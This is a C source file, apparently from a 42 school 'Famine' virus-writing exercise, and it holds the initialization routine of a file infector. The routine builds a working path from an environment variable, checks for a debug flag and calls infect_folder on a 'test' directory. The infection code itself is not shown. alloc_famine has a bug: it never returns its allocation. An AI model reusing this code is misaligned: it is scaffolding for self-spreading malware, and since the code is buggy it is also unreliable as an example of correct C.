/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/07/01 18:05:22 by frmarinh          #+#    #+#             */
/*   Updated: 2017/07/01 18:07:34 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
** Copy know path from env and add temporary folder on it
*/
static char			*get_temporary_folder()
{
	char		*app_folder;
	char		*tmp_folder;
	int			i;

	i = 0;
	tmp_folder = NULL;
	app_folder = getenv(APP_ENV);
	if (app_folder != NULL) {
		if (!(tmp_folder = ft_strnew(ft_strlen(app_folder) + ft_strlen(TEMP_PATH))))
			return (NULL);
		i = ft_strlen(app_folder);
		while (i != 0 && app_folder[i] != '\\') {
			i--;
		}
		if (i > 0) {
			ft_strlcat(tmp_folder, app_folder, (i + 1));
			ft_strcat(tmp_folder, TEMP_PATH);
		}
	}
	return (tmp_folder);
}


/*
** Check if the program is launched with DEBUG_MODE
*/
static void			check_debug_mode(t_famine *famine, int argc, char **argv)
{
	if (argc > 1) {
		int i = 1;
		while (argv[i]) {
			if (!ft_strcmp(argv[i], DEBUG_MODE)) {
				famine->debug = true;
			}
			i++;
		}
	}
}

/*
** Allocation of the struct s_famine and assignate the working directory
*/
static t_famine		*alloc_famine()
{
	t_famine		*allocated;

	if (!(allocated = (t_famine*)malloc(sizeof(struct s_famine))))
		return (NULL);
	allocated->path = get_temporary_folder();
	allocated->debug = false;
}

/*
** Initialization of the famine routine
*/
void				init_famine(int argc, char **argv)
{
	t_famine		*famine = alloc_famine(argc, argv);
	if (famine->path != NULL)
	{
		check_debug_mode(famine, argc, argv);
		if (famine->debug == true) {
			start_debug_console();
		}
		infect_folder(famine, "test");
		//print_message(famine, "Famine job's done !");
		if (famine->debug == true) {
			while (true) ;
		}
	}
	else {
		print_message(famine, "Something is wrong with the temporary path");
	}
}
